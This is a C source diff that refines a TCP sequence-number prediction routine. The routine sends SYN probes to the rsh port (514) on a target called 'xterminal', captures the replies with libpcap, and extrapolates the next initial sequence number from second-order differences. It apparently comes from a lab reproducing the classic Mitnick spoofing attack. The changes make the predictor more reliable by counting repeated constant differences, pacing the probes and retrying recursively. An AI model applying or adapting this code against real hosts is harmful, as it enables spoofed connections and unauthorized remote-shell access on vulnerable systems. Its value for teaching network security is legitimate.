@@ -223,14 +223,13 @@ uint32_t predict (pcap_t *handler, libnet_t *l, u_long xterminal_ip, u_long own_
     int32_t diff_array[amt_iter];
 
     uint32_t constant_second_order_diff = 29281;
-
+    uint32_t constant_sightings = 0;
     printf("Probing now:\n");
-    int ready_to_guess = 0;
     int i;
     for (i = 0; i < amt_iter; i++)
     {
         send_syn(514, NULL, 0, l, xterminal_ip, own_ip, libnet_get_prand(LIBNET_PRu32), libnet_get_prand(LIBNET_PRu32));
-        
+        sleep(1);
         struct pcap_pkthdr header;
         const u_char *packet = pcap_next(handler, &header);
         if(packet == NULL) {
@@ -243,7 +242,7 @@ uint32_t predict (pcap_t *handler, libnet_t *l, u_long xterminal_ip, u_long own_
         uint32_t seq = ntohl(tcp_header->th_seq);
         uint32_t ack = ntohl(tcp_header->th_ack);
         
-        printf("received seq %u, ack %u\n", seq, ack);
+//        printf("received seq %u, ack %u\n", seq, ack);
         seq_array[i] = (uint32_t)seq;
         
         if(i > 0){
@@ -255,19 +254,21 @@ uint32_t predict (pcap_t *handler, libnet_t *l, u_long xterminal_ip, u_long own_
             if(i > 1) {
                 // Calc second order diff
                 int32_t second_order_diff = (int32_t)diff_array[i-1] - (int32_t)diff_array[i-2];
+                
                 printf("Diff[%u] - Diff[%u]: %d\n", i, i-1,second_order_diff);
                 
-                if(second_order_diff != constant_second_order_diff) {
-                    if (ready_to_guess == 1){
-                        int32_t next_diff = constant_second_order_diff + diff_array[i-1];
-                        printf("Next diff will be: %d\n",next_diff);
-                        uint32_t next_seq = seq_array[i] + next_diff;
-                        printf("Next sequence number will be: %u\n",next_seq);
-                        pcap_close(handler);
-                        return next_seq;
-                    } else {
-                        ready_to_guess = 1;
-                    }
+                if(second_order_diff == constant_second_order_diff ) {
+                    constant_sightings++;
+                } else if (constant_sightings > 1) {
+                    int32_t next_diff = constant_second_order_diff + diff_array[i-1];
+                    printf("Next diff will be: %d\n",next_diff);
+                    uint32_t next_seq = seq_array[i] + next_diff;
+                    printf("Next sequence number will be: %u\n",next_seq);
+                    pcap_close(handler);
+                    return next_seq;
+              
+                } else if (i >5){
+                    return predict(handler,l,xterminal_ip,own_ip);
                 }
             }
         }
